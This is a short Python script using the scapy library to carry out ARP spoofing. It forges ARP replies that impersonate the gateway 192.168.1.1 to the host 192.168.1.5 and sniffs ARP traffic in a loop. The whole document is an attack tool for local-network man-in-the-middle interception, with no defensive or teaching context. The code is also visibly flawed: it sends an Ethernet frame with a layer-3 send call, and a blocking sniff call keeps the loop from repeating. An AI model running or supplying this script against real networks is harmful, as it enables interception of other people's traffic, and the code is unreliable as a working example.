from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, sniff

def arp_spoof(target_ip, gateway_ip, interface="eth0"):
    arp_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    ether_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet

    send(ether_packet, verbose=False)

def packet_sniffer(interface="eth0"):
    def arp_display(packet):
        if packet.haslayer(ARP):
            print(f"ARP packet detected: {packet.summary()}")

    sniff(iface=interface, filter="arp", prn=arp_display, store=False)

target_ip = "192.168.1.5"  
gateway_ip = "192.168.1.1"  
interface = "eth0"  


try:
    print("Starting ARP spoofing...")
    while True:
        arp_spoof(target_ip, gateway_ip, interface)
        packet_sniffer(interface)
except KeyboardInterrupt:
    print("Program interrupted by user.")
